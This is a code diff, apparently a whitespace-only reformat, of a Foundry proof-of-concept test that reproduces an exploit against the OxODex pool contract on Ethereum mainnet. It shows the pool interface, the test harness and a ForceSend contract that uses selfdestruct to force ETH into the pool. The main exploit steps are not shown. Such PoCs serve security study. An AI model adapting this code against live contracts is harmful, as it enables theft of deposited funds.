@@ -18,10 +18,12 @@ import "./../interface.sol";
 // Some changes were made to make the poc work
 
 library Types {
+
     enum WithdrawalType {
         Direct,
         Swap
     }
+
 }
 
 struct WithdrawalData {
@@ -37,6 +39,7 @@ struct WithdrawalData {
 }
 
 interface IOxODexPool {
+
     function deposit(uint256 _amount, uint256[4] memory _publicKey) external payable;
 
     function withdraw(
@@ -57,9 +60,11 @@ interface IOxODexPool {
     function getCurrentRingIndex(uint256 amountToken) external view returns (uint256);
 
     function getRingHash(uint256 _amountToken, uint256 _ringIndex) external view returns (bytes32);
+
 }
 
 contract ContractTest is Test {
+
     IOxODexPool private constant OxODexPool = IOxODexPool(0x3d18AD735f949fEbD59BBfcB5864ee0157607616);
     WETH9 private constant WETH = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
     IERC20 private constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
@@ -251,12 +256,15 @@ contract ContractTest is Test {
     }
 
     receive() external payable {}
+
 }
 
 contract ForceSend {
+
     IOxODexPool private constant OxODexPool = IOxODexPool(0x3d18AD735f949fEbD59BBfcB5864ee0157607616);
 
     constructor() payable {
         selfdestruct(payable(address(OxODexPool)));
     }
+
 }
